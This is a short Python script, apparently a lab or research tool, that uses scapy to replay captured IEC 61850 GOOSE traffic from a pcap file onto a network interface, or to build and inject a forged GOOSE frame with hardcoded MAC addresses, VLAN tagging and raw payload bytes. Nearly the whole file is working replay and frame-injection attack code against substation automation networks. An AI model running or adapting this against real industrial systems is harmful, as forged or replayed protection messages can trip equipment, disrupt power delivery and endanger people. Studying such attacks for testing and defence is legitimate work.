#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
import os
import socket
import sys
import pyshark
#import trollius


def inputValues():
    interface = input("Enter interface name in used: ");
    #print(type(interface))
    #senderMac = input("Enter sender MAC Address[FORMAT->XX:XX:XX:XX:XX:XX]: ");
    return interface

def replayGooseTraffic(interface):
    #print(interface + " " + senderMac)
    pcap_file = input("Enter the saved pcap file without extension: ");
    decoded = pyshark.FileCapture(pcap_file + ".pcap")
    print(decoded[0]);
    traffic = rdpcap(pcap_file + '.pcap');
    #print(traffic)

    for frame in traffic:
        
        if frame.haslayer(Ether) == 1 or frame.haslayer(Dot1Q) == 1 or frame.haslayer(Raw) == 1:
            #print(frame) #payload oluşturmak için kullanılabilir.
            a =sendp(frame, iface = interface);
            #print("*************" + a)
            time.sleep(0.01)
            
#def MMS_replay():

#def sav_replay():

def payload(interface):
#pcap_file = input("Enter the saved pcap file without extension: ");
#traffic2 = rdpcap(pcap_file + '.pcap')

    header_content = Ether()
    #header_content.dst = "00:50:56:3D:9E:FD"
    #header_content.src = "00:50:56:3C:BB:7B"
    header_content.src = "00:0c:29:d2:27:ad"
    header_content.dst = "01:0c:cd:01:00:00" 
    header_content.type = 0x8100 #802.1q tagi ETHER TYPE - HEXADECIMAL
  
    # CONSTRUCTING VLAN HEADER  0x88b8 -> GOOSE protocol type
    header_VLAN = Dot1Q()
    header_VLAN.prio = 4
    header_VLAN.id = 0
    header_VLAN.vlan = 0
    header_VLAN.type = 0x88b8

    # CONSTRUCTING GOOSE MESSAGE
    goose_msg = Raw()
    #a = '\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$FGX\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00'
    a = "\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$FGX\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00"
    goose_msg.load = a

    #"b'\x01\x0c\xcd\x01\x00\x00\x00\x0c)\xd2'\xaf\x81\x00\x80\x00\x88\xb8\x00\x01\x00N\x00\x00\x80\x00aD\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$DS2\x83\x02G1\x84\x08`\x95X@O\xdf9T\x85\x01\x01\x86\x01\x1d\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\t\x83\x01\x00\x85\x01 \x83\x01\x00'"

    #"b'\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$DS2\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00'"

    #print("Decoded message :" + b'\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$DS2\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00'.decode('latin-1'))

    # blablabla
    ls(header_VLAN)
    ls(goose_msg)
    ls(header_content)
    #interface = input("\n enter interface:")
    new_Goose_Frame = header_content/header_VLAN/goose_msg
    #del new_Goose_Frame[header_VLAN].chksum
    print(new_Goose_Frame)
    sendp(new_Goose_Frame, iface = interface,verbose=0)
    time.sleep(0.01)


if __name__ == '__main__':
    interface = inputValues()
    key=input("Enter that what you want bro?:\n[1]: send pcap frame\n[2]: send frame payload\n");
    if key == "1":        
        replayGooseTraffic(interface)
    elif key == "2":
        payload(interface)
    else:
        print("get out there!")
